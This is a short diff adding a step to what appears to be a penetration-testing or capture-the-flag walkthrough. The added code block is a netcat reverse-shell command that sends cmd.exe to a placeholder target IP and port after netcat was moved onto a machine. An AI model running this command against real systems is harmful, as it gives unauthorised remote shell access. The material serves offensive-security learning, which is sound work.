@@ -186,3 +186,6 @@ go
 
 *AFTER GETTING A SHELL TRANSFERRED NETCAT AND THEN RUN A REVERSE SHELLA AND GOT A FULL SHELL*
 
+```SHELL
+nc.exe -e cmd.exe <targetip> <targetport>
+```
